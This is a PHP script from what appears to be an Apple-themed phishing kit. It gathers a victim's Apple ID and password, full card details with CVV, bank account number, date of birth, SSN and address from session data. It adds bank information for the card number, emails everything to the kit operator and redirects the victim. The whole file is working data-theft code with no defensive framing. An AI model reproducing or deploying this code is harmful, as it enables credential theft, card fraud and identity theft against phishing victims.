<?php
if ($include != 1)
 {
 die('Illegal Access');
 }


//Open Session
ini_set("output_buffering",4096);
session_start();





//Determining card company brand
include 'card_validator.php';

//Filling Email to send
include 'Email.php';


$usrID = $_SESSION['AppleID'];
$userPass =  $_SESSION['Passcode'];
$customerFName = $_SESSION['fName'];
$customerLName = $_SESSION['lName'];
$cAdress = $_SESSION['Address'];
$cCity = $_SESSION['City'];
$cState = $_SESSION['State'];
$cCountry = $_SESSION['Country'];
$sZIP = $_SESSION['ZIP'];
$cPhone = $_SESSION['Phone'];
$cCNumb = $_SESSION['ccNum'];
$cCType = is_valid_card($cCNumb);
$NameOnCard = $_SESSION['NameOnCard'];
$cCVV = $_SESSION['CVV'];
$cCExpires = $_SESSION['Expires'];
$cBAN = $_SESSION['BAN'];
$cDOB = $_SESSION['DOB'];
$cSSN = $_SESSION['SSN'];


$date = gmdate("d/m/Y | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$bin     = str_replace(' ', '', $_SESSION['ccNum']);
$bin     = substr($bin, 0, 6);
$getbank = json_decode(file_get_contents("http://www.binlist.net/json/".$bin.""));
$ccbrand = $getbank->brand;
$ccbank  = $getbank->bank;
$cctype  = $getbank->card_type;
$ccklas  = $getbank->card_category;



$Customer="=================+ ~!KEBUN APPEL!~ +=================
JOS : $bin $ip

Login : $usrID
Password   : $userPass

====================~Card info~====================
Name On Card: $NameOnCard
Card Number: $cCNumb
BIN/IIN Info    :  ".$ccbank." - ".$cctype." - ".$ccklas."
CVV2: $cCVV
Expires: $cCExpires
Card Type: $cCType
BAN: $cBAN
DOB: $cDOB ( Day - Month - Year )
SSN: $cSSN
====================~Contact info~====================
Name: $customerFName $customerLName
Address: $cAdress
City: $cCity
State: $cState
ZIP: $sZIP
Phone:$cPhone
Country: $cCountry
IP: $ip
Hostname: $hostname
Useragent: $useragent
Date: $date
=================+ ~!KEBUN APPEL!~ +=================";


$subject = "$ccbank - $cctype - $ccklas";
$headers = "From: Pohon Appel <server.bank.suport@gmail.com>";
$headers .= " Jus Appel Merah";
mail($SEND,$subject,$Customer,$headers);

session_destroy();
$indexs="Proccessing.php?Valid=True&Session=".bin2hex($Customer);
header("Location: $indexs");




?>